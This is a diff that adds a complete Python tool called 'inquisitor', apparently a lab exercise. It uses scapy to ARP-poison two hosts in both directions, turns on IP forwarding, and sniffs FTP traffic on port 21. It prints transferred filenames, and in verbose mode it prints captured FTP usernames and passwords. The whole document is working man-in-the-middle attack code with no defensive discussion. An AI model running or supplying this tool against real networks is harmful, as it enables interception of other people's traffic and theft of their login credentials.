@@ -1,0 +1,228 @@
+#!/usr/bin/env python3
+import sys
+import os
+import signal
+import time
+import logging
+from scapy.all import ARP, Ether, send, sniff, conf, get_if_hwaddr
+
+# Suppress scapy warnings
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+conf.verb = 0
+
+# Global variables
+running = True
+verbose_mode = False
+cleanup_done = False
+
+def print_help():
+    print("Usage: ./inquisitor [-v] <IP-src> <MAC-src> <IP-target> <MAC-target>")
+    print("\nOptions:")
+    print("  -v, --verbose    Show all FTP traffic (not just filenames)")
+    print("\nExample:")
+    print("  ./inquisitor 192.168.1.5 aa:bb:cc:dd:ee:ff 192.168.1.10 11:22:33:44:55:66")
+    sys.exit(0)
+
+def validate_ip(ip):
+    """Validate IPv4 address format"""
+    try:
+        parts = ip.split('.')
+        if len(parts) != 4:
+            return False
+        for part in parts:
+            num = int(part)
+            if num < 0 or num > 255:
+                return False
+        return True
+    except:
+        return False
+
+def validate_mac(mac):
+    """Validate MAC address format"""
+    try:
+        parts = mac.split(':')
+        if len(parts) != 6:
+            return False
+        for part in parts:
+            int(part, 16)
+        return True
+    except:
+        return False
+
+def enable_ip_forwarding():
+    """Enable IP forwarding to allow packet routing"""
+    try:
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        print("[+] IP forwarding enabled")
+    except:
+        print("[-] Failed to enable IP forwarding")
+
+def disable_ip_forwarding():
+    """Disable IP forwarding"""
+    try:
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        print("[+] IP forwarding disabled")
+    except:
+        pass
+
+def arp_poison(target_ip, target_mac, fake_ip):
+    """Send ARP poisoning packet"""
+    # Create ARP reply packet with Ethernet layer
+    # Tell target_ip that fake_ip has MY MAC address
+    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=fake_ip)
+    send(packet, verbose=False)
+
+def restore_arp(target_ip, target_mac, real_ip, real_mac):
+    """Restore correct ARP mapping"""
+    # Send correct ARP reply with Ethernet layer
+    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
+    send(packet, verbose=False, count=5)
+
+def packet_callback(packet):
+    """Callback function for sniffed packets"""
+    global verbose_mode
+    
+    # Check if packet has TCP layer and is FTP traffic
+    if packet.haslayer('TCP') and packet.haslayer('Raw'):
+        # FTP control traffic is on port 21
+        if packet['TCP'].dport == 21 or packet['TCP'].sport == 21:
+            try:
+                payload = packet['Raw'].load.decode('utf-8', errors='ignore')
+                
+                if verbose_mode:
+                    # Show all FTP commands
+                    lines = payload.strip().split('\r\n')
+                    for line in lines:
+                        if line:
+                            print(f"[*] FTP: {line}")
+                            
+                            # Highlight login credentials
+                            if line.startswith('USER '):
+                                username = line.split(' ', 1)[1]
+                                print(f"[!] FTP Username: {username}")
+                            elif line.startswith('PASS '):
+                                password = line.split(' ', 1)[1]
+                                print(f"[!] FTP Password: {password}")
+                else:
+                    # Only show file transfer commands
+                    if 'STOR ' in payload:
+                        filename = payload.split('STOR ')[1].split('\r\n')[0].strip()
+                        print(f"[*] FTP: Uploading {filename}")
+                    elif 'RETR ' in payload:
+                        filename = payload.split('RETR ')[1].split('\r\n')[0].strip()
+                        print(f"[*] FTP: Downloading {filename}")
+            except:
+                pass
+
+def signal_handler(sig, frame):
+    """Handle CTRL+C to restore ARP tables"""
+    global running, cleanup_done
+    if cleanup_done:
+        return
+    cleanup_done = True
+    print("\n[!] CTRL+C detected, restoring ARP tables...")
+    running = False
+
+def main():
+    global running, verbose_mode
+    
+    args = sys.argv[1:]
+    
+    # Check for help
+    if '-h' in args or '--help' in args or len(args) < 4:
+        print_help()
+    
+    # Check for verbose mode
+    if '-v' in args or '--verbose' in args:
+        verbose_mode = True
+        args = [arg for arg in args if arg not in ['-v', '--verbose']]
+    
+    # Validate arguments
+    if len(args) != 4:
+        print("Error: Invalid number of arguments")
+        print_help()
+    
+    ip_src, mac_src, ip_target, mac_target = args
+    
+    # Validate IPs
+    if not validate_ip(ip_src):
+        print(f"Error: Invalid source IP address: {ip_src}")
+        sys.exit(1)
+    
+    if not validate_ip(ip_target):
+        print(f"Error: Invalid target IP address: {ip_target}")
+        sys.exit(1)
+    
+    # Validate MACs
+    if not validate_mac(mac_src):
+        print(f"Error: Invalid source MAC address: {mac_src}")
+        sys.exit(1)
+    
+    if not validate_mac(mac_target):
+        print(f"Error: Invalid target MAC address: {mac_target}")
+        sys.exit(1)
+    
+    # Setup signal handler for CTRL+C
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    print("=" * 60)
+    print("INQUISITOR - ARP Poisoning & FTP Sniffer")
+    print("=" * 60)
+    print(f"Source:     {ip_src} ({mac_src})")
+    print(f"Target:     {ip_target} ({mac_target})")
+    print(f"Verbose:    {verbose_mode}")
+    print("=" * 60)
+    
+    # Enable IP forwarding
+    enable_ip_forwarding()
+    
+    # Start packet sniffing in background
+    print("[+] Starting packet sniffer...")
+    from threading import Thread
+    sniffer_thread = Thread(target=lambda: sniff(
+        filter="tcp port 21",
+        prn=packet_callback,
+        store=False,
+        stop_filter=lambda x: not running
+    ))
+    sniffer_thread.daemon = True
+    sniffer_thread.start()
+    
+    print("[+] Starting ARP poisoning (Press CTRL+C to stop)...")
+    print()
+    
+    try:
+        while running:
+            # Poison both directions
+            # Tell source: "I am target"
+            arp_poison(ip_src, mac_src, ip_target)
+            
+            # Tell target: "I am source"
+            arp_poison(ip_target, mac_target, ip_src)
+            
+            time.sleep(2)
+    
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    
+    finally:
+        # Restore ARP tables
+        print("[+] Restoring ARP tables...")
+        for _ in range(3):
+            restore_arp(ip_src, mac_src, ip_target, mac_target)
+            restore_arp(ip_target, mac_target, ip_src, mac_src)
+            time.sleep(1)
+        
+        # Disable IP forwarding
+        disable_ip_forwarding()
+        
+        print("[+] ARP tables restored")
+        print("[+] Attack stopped")
+
+if __name__ == "__main__":
+    # Check if running as root
+    if os.geteuid() != 0:
+        print("Error: This program must be run as root (use sudo)")
+        sys.exit(1)
+    
+    main()
